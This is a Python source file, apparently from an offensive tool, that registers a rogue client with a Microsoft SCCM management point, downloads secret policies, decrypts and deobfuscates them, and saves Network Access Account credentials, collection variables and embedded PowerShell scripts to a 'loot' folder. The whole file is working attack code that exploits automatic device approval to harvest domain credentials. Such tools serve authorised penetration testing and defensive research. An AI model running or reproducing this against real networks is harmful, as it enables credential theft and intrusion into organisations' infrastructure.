import os
import zlib
import json
import base64
import logging
import requests
import binascii
import traceback
import xml.etree.ElementTree                as ET

from cryptography.hazmat.primitives         import serialization
from datetime                               import datetime
from requests_ntlm                          import HttpNtlmAuth
from requests_toolbelt.multipart            import decoder
from utils.crypto                           import create_private_key, create_certificate, SCCM_sign, build_MS_public_key_blob
from utils.request_templates                import *
from utils.utils                            import encode_UTF16_strip_BOM, clean_junk_in_XML
from utils.policy_decrypt                   import decrypt_secret_policy
from utils.deobfuscate_secret_policy_blob   import deobfuscate_secret_policy_blob

from conf                               import bcolors, DATE_FORMAT, MP_INTERACTIONS_HEADERS, SCCMPoliciesDumpError

logger = logging.getLogger(__name__)


class PoliciesDumper():

    def __init__(self, management_point,
                 output_dir,
                 client_name,
                 use_existing_device,
                 machine_name,
                 machine_pass
                ):
        self.management_point = management_point
        self.output_dir = output_dir
        self.client_name = client_name
        self.use_existing_device = use_existing_device
        self.machine_name = machine_name
        self.machine_pass = machine_pass
        self.client_guid = ""
        self.secret_policies = {}
        
        # If we are not using an existing device, create and save self-signed certificates
        if self.use_existing_device is None:
            os.makedirs(f"loot/{self.output_dir}/device")
            self.private_key = create_private_key()
            self.certificate = create_certificate(self.private_key)
            self.public_key = self.certificate.public_bytes(serialization.Encoding.DER).hex().upper()
            with open(f"loot/{self.output_dir}/device/cert.pem", 'wb') as f:
                f.write(self.certificate.public_bytes(serialization.Encoding.PEM))
            with open(f"loot/{self.output_dir}/device/key.pem", 'wb') as f:
                f.write(self.private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()))
        # If we are, load private key and GUID
        else:
            try:
                if use_existing_device.endswith('/'): use_existing_device = use_existing_device[:-1]
                with open(f'{use_existing_device}/key.pem', 'rb') as f:
                    key_data = f.read()
                self.private_key = serialization.load_pem_private_key(key_data, password=None)
                with open(f'{use_existing_device}/guid.txt', 'r') as f:
                    self.client_guid = f.read().strip()
            except Exception as e:
                raise Exception(f"Error while retrieving existing device information").with_traceback(e.__traceback__)
        
        self.session = requests.Session()
        self.session.headers.update(MP_INTERACTIONS_HEADERS)
        if machine_name is not None and machine_pass is not None and use_existing_device is None:
            self.session.auth = HttpNtlmAuth(machine_name, machine_pass)


    @staticmethod
    def parse_policies_flags(policyFlagValue):
        policyFlagValue = int(policyFlagValue)
        NONE                        = 0b0000000
        TASKSEQUENCE                = 0b0000001
        REQUIRESAUTH                = 0b0000010
        SECRET                      = 0b0000100
        INTRANETONLY                = 0b0001000
        PERSISTWHOLEPOLICY          = 0b0010000
        AUTHORIZEDDYNAMICDOWNLOAD   = 0b0100000
        COMPRESSED                  = 0b1000000 

        result = []
        if policyFlagValue & TASKSEQUENCE != 0:
            result.append("TASKSEQUENCE")
        if policyFlagValue & REQUIRESAUTH != 0:
            result.append("REQUIRESAUTH")
        if policyFlagValue & SECRET != 0:
            result.append("SECRET")
        if policyFlagValue & INTRANETONLY != 0:
            result.append("INTRANETONLY")
        if policyFlagValue & PERSISTWHOLEPOLICY != 0:
            result.append("PERSISTWHOLEPOLICY")
        if policyFlagValue & AUTHORIZEDDYNAMICDOWNLOAD != 0:
            result.append("AUTHORIZEDDYNAMICDOWNLOAD")
        if policyFlagValue & COMPRESSED != 0:
            result.append("COMPRESSED")
        return result


    def generate_registration_request_payload(self):
        registrationRequest = REGISTRATION_REQUEST_TEMPLATE.format(
            date=datetime.now().strftime(DATE_FORMAT),
            encryption=self.public_key,
            signature=self.public_key,
            client=self.client_name.split('.')[0],
            clientfqdn=self.client_name
        )

        signature = SCCM_sign(self.private_key, encode_UTF16_strip_BOM(registrationRequest)).hex().upper()
        registrationRequestWrapper = REGISTRATION_REQUEST_WRAPPER_TEMPLATE.format(
        data=registrationRequest,
        signature=signature
        )
        registrationRequestWrapper = encode_UTF16_strip_BOM(registrationRequestWrapper) + "\r\n".encode('ascii')

        registrationRequestHeader = SCCM_HEADER_TEMPLATE.format(
            bodylength=len(registrationRequestWrapper)-2,
            client=self.client_name,
            date=datetime.now().strftime(DATE_FORMAT),
            sccmserver=self.management_point
        )

        final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
        final_body += registrationRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
        final_body += zlib.compress(registrationRequestWrapper) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        return final_body


    def register_client(self):
        logger.warning(f"{bcolors.OKCYAN}\n[*] Registering SCCM client with FQDN {self.client_name}{bcolors.ENDC}")
        registration_request_payload = self.generate_registration_request_payload()

        additional_headers = {
            "Connection": "close",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }
        if self.machine_name is not None and self.machine_pass is not None:
            r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system_windowsauth/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
            if r.status_code != 200:
                raise SCCMPoliciesDumpError(f"Authenticated registration endpoint returned a non-200 status code ({r.status_code}). Did you provide valid credentials?")
        else:
            r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
        multipart_data = decoder.MultipartDecoder.from_response(r)
        for part in multipart_data.parts:
            if part.headers[b'content-type'] == b'application/octet-stream':
                register_response = zlib.decompress(part.content).decode('utf-16')
        root = ET.fromstring(register_response[:-1])
        self.client_guid = root.attrib["SMSID"].split("GUID:")[1]

        with open(f"loot/{self.output_dir}/device/guid.txt", 'w') as f:
            f.write(f"{self.client_guid}\n")
        with open(f"loot/{self.output_dir}/device/client_name.txt", 'w') as f:
            f.write(f"{self.client_name}\n")

        logger.warning(f"{bcolors.OKGREEN}[+] Client registration complete - GUID: {self.client_guid}.{bcolors.ENDC}")
        # After client registration was successful, we don't need NTLM authentication anymore for our session
        self.session.auth = None


    def generate_policies_request_payload(self):
        policyRequest = encode_UTF16_strip_BOM(POLICY_REQUEST_TEMPLATE.format(
            clientid=self.client_guid,
            clientfqdn=self.client_name,
            client=self.client_name.split('.')[0]
        )) + b"\x00\x00\r\n"
        policyRequestCompressed = zlib.compress(policyRequest)

        MSPublicKey = build_MS_public_key_blob(self.private_key)
        clientID = f"GUID:{self.client_guid.upper()}"
        clientIDSignature = SCCM_sign(self.private_key, encode_UTF16_strip_BOM(clientID) + "\x00\x00".encode('ascii')).hex().upper()
        policyRequestSignature = SCCM_sign(self.private_key, policyRequestCompressed).hex().upper()

        policyRequestHeader = POLICY_REQUEST_HEADER_TEMPLATE.format(
            bodylength=len(policyRequest)-2, 
            sccmserver=self.management_point, 
            client=self.client_name.split('.')[0],
            publickey=MSPublicKey, 
            clientIDsignature=clientIDSignature, 
            payloadsignature=policyRequestSignature, 
            clientid=self.client_guid, 
            date=datetime.now().strftime(DATE_FORMAT)
        )

        final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
        final_body += policyRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
        final_body += policyRequestCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        return final_body


    def request_policies(self):
        logger.warning(f"{bcolors.OKCYAN}\n[*] Requesting device policies {self.client_name}{bcolors.ENDC}")
        policies_request_payload = self.generate_policies_request_payload()
        additional_headers = {
            "Connection": "close",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }
        r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system/request", headers={**self.session.headers, **additional_headers}, data=policies_request_payload)
        multipart_data = decoder.MultipartDecoder.from_response(r)
        for part in multipart_data.parts:
            if part.headers[b'content-type'] == b'application/octet-stream':
                policies_response = zlib.decompress(part.content).decode('utf-16')
        
        root = ET.fromstring(policies_response[:-1])
        policies = root.findall(".//Policy")
        policies_json = {}
        for policy in policies:
            policies_json[policy.attrib["PolicyID"]] = {"PolicyVersion": policy.attrib["PolicyVersion"] if "PolicyVersion" in policy.attrib else "N/A",
                                            "PolicyType": policy.attrib["PolicyType"] if "PolicyType" in policy.attrib else "N/A",
                                            "PolicyCategory": policy.attrib["PolicyCategory"] if "PolicyCategory" in policy.attrib else "N/A",
                                            "PolicyFlags": PoliciesDumper.parse_policies_flags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A",
                                            "PolicyLocation": policy[0].text.replace("<mp>", self.management_point.split('http://')[1]) }
    
        os.makedirs(f'loot/{self.output_dir}/policies/')
        with open(f'loot/{self.output_dir}/policies/policies.json', 'w') as f:
            f.write(json.dumps(policies_json))
        with open(f'loot/{self.output_dir}/policies/policies.raw', 'w') as f:
            f.write(policies_response)

        for key, value in policies_json.items():
            if isinstance(value["PolicyFlags"], list) and "SECRET" in value["PolicyFlags"]:
                self.secret_policies[key] = value

        logger.warning(f"{bcolors.OKGREEN}[+] Policies list retrieved ({len(policies_json.keys())} total policies ; {bcolors.BOLD}{len(self.secret_policies.keys())} secret policies{bcolors.ENDC}){bcolors.ENDC}")
        if self.use_existing_device is None and self.machine_name is None and len(self.secret_policies.keys()) > 0:
            logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies without providing credentials, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")


    def parse_secret_policies(self):
        if len(self.secret_policies.keys()) == 0:
            logger.warning(f"[-] No secret policies found. If you attempted to exploit automatic device approval, it may not be enabled.")
            return
        for key, value in self.secret_policies.items():
            logger.warning(f"{bcolors.OKGREEN}[+] Processing secret policy {key}.{bcolors.ENDC}")
            try:
                result = self.process_secret_policy(key, value)
                if result is not None:
                    if len(result[0].strip('\x00')) == 0 and len(result[1].strip('\x00')) == 0:
                        logger.warning(f"[-] NAA policy parsed, but no NAA account seem to be configured as credentials are empty ('{result[0]}:{result[1]}')")
                    else:
                        logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result[0]}:{result[1]}'{bcolors.ENDC}")
            except Exception as e:
                traceback.print_exc()
                logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy {key}{bcolors.ENDC}")
            logger.warning("\n")


    def request_policy(self, policy_url):
        additional_headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "ClientToken": f"GUID:{self.client_guid};{datetime.now().strftime(DATE_FORMAT)};2",
            "ClientTokenSignature": SCCM_sign(self.private_key, f"GUID:{self.client_guid};{datetime.now().strftime(DATE_FORMAT)};2".encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
        }

        r = self.session.get(policy_url, headers={**self.session.headers, **additional_headers})
        return r.content
        

    def process_secret_policy(self, policyID, policy):
        logger.info(f"[INFO] Dumping secret policy {policyID}")
        os.makedirs(f'loot/{self.output_dir}/policies/{policyID}')


        NAA_username = None
        NAA_password = None
        policy_response = self.request_policy(policy["PolicyLocation"])
        decrypted = decrypt_secret_policy(policy_response, self.private_key)[:-1]
        decrypted = clean_junk_in_XML(decrypted)
        
        if policy["PolicyCategory"] == "CollectionSettings":
            logger.info("[INFO] Processing a CollectionSettings policy to extract collection variables")
            root = ET.fromstring(decrypted)
            binary_data = binascii.unhexlify(root.text)
            decompressed_data = zlib.decompress(binary_data)
            decrypted = decompressed_data.decode('utf16')

        with open(f'loot/{self.output_dir}/policies/{policyID}/policy.txt', 'w') as f:
            f.write(decrypted)
        
        
        root = ET.fromstring(decrypted)
        blobs_set = {}
        if policy["PolicyCategory"] == "CollectionSettings":
            for instance in root.findall(".//instance"):
                name = None
                value = None
                for prop in instance.findall('property'):
                    prop_name = prop.get('name')
                    if prop_name == 'Name':
                        name = prop.find('value').text.strip()
                    elif prop_name == 'Value':
                        value = prop.find('value').text.strip()
                blobs_set[name] = value

        else:
            obfuscated_blobs = root.findall('.//*[@secret="1"]')    
            for obfuscated_blob in obfuscated_blobs:       
                blobs_set[obfuscated_blob.attrib["name"]] = obfuscated_blob[0].text
        
        logger.warning(f"[*] Found {bcolors.BOLD}{len(blobs_set.keys())}{bcolors.ENDC} obfuscated blob(s) in secret policy.")
        for i, blob_name in enumerate(blobs_set.keys()):
            data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
            filename = f'loot/{self.output_dir}/policies/{policyID}/secretBlob_{str(i+1)}-{blob_name}.txt'
            with open(filename, 'w') as f:
                f.write(f"Secret property name: {blob_name}\n\n")
                f.write(data + "\n")
            if blob_name == "NetworkAccessUsername":
                NAA_username = data
            if blob_name == "NetworkAccessPassword":
                NAA_password = data

            logger.info(f"[INFO] Deobfuscated blob n°{i+1}")
            try:
                blobroot = ET.fromstring(clean_junk_in_XML(data))
                source_scripts = blobroot.findall('.//*[@property="SourceScript"]')
                if len(source_scripts) > 0:
                    logger.warning(f"[*] Found {bcolors.BOLD}{len(source_scripts)} embedded powershell scripts in blob.{bcolors.ENDC}")
                    for j, script in enumerate(source_scripts):
                        decoded_script = base64.b64decode(script.text).decode('utf-16le')
                        with open(f'loot/{self.output_dir}/policies/{policyID}/secretBlob_{str(i+1)}-{blob_name}_embeddedScript_{j+1}.txt', 'w') as f:
                            f.write(decoded_script)
                            f.write("\n")
            except ET.ParseError as e:
                logger.info("[INFO] Failed parsing XML on this blob - not XML content (expected)")
                pass
        
        if NAA_username is not None or NAA_password is not None:
            return (NAA_username, NAA_password)
        else:
            return None